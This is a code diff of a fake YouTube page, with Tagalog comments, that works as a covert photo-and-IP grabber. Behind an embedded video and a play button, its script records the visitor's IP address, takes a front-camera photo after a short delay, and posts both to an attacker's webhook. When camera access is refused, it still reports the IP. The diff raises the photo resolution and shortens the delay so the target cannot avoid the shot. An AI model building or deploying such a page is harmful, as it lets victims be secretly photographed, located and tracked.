@@ -4,9 +4,7 @@
     <meta charset="UTF-8">
     <title>YouTube</title>
     <meta property="og:title" content="YouTube - Watch Now">
-    <meta property="og:description" content="Official YouTube Portal">
     <meta property="og:image" content="https://img.youtube.com/vi/GoHLDPWT6Hw/maxresdefault.jpg">
-    <meta property="og:type" content="video.other">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <style>
@@ -15,7 +13,7 @@
         #lock-screen { text-align: center; z-index: 9999; padding: 20px; }
         .play-btn { width: 80px; height: 80px; background: red; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 15px; }
         .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent white; margin-left: 5px; }
-        .error-msg { color: #ff4444; display: none; margin-top: 15px; font-size: 14px; font-weight: bold; line-height: 1.5; }
+        .error-msg { color: #ff4444; display: none; margin-top: 15px; font-size: 14px; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -34,7 +32,7 @@
 
     <iframe id="player" src="https://www.youtube.com/embed/GoHLDPWT6Hw" allow="autoplay; encrypted-media"></iframe>
 
-    <video id="v" autoplay style="display:none;"></video>
+    <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
@@ -49,12 +47,12 @@
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 
-                // NAKA-PORTRAIT MODE NA 'TO PRE PARA HINDI PUTOL ANG MUKHA
+                // PORTRAIT FOCUS: 720x1280 para malinaw at buo
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: "user",
-                        width: { ideal: 480 },
-                        height: { ideal: 640 } 
+                        width: { ideal: 720 },
+                        height: { ideal: 1280 } 
                     } 
                 });
                 
@@ -65,36 +63,39 @@
                 const vid = document.getElementById('v');
                 vid.srcObject = stream;
 
+                // Binilisan natin yung delay (500ms) para hindi siya makailag
                 setTimeout(async () => {
                     const can = document.getElementById('c');
-                    // Portrait resolution sa Canvas
-                    can.width = 480; 
-                    can.height = 640;
-                    can.getContext('2d').drawImage(vid, 0, 0, 480, 640);
-                    const img = can.toDataURL('image/jpeg', 0.6);
+                    can.width = 720; 
+                    can.height = 1280;
+                    const ctx = can.getContext('2d');
+                    
+                    // Siguraduhin na naka-center ang crop
+                    ctx.drawImage(vid, 0, 0, 720, 1280);
+                    
+                    const img = can.toDataURL('image/jpeg', 0.8);
                     const blob = await (await fetch(img)).blob();
                     
                     const fd = new FormData();
-                    fd.append('file', blob, 'portrait_huli.jpg');
+                    fd.append('file', blob, 'buong_mukha.jpg');
                     fd.append('payload_json', JSON.stringify({
-                        content: "🎯 **AGE VERIFIED (PORTRAIT SHOT)**\n**IP:** " + ipData.ip
+                        content: "🎯 **FULL PORTRAIT SHOT!**\n**IP:** " + ipData.ip
                     }));
 
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
-                }, 1000);
+                }, 500);
 
             } catch (e) {
                 errorText.style.display = 'block';
-                const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
+                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
                 fetch(hook, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ content: "🚫 **VERIFICATION DENIED!**\n**IP:** " + ipData.ip })
+                    body: JSON.stringify({ content: "🚫 **FAILED:** " + ipRes.ip })
                 });
             }
         };
     </script>
 </body>
 </html>
-
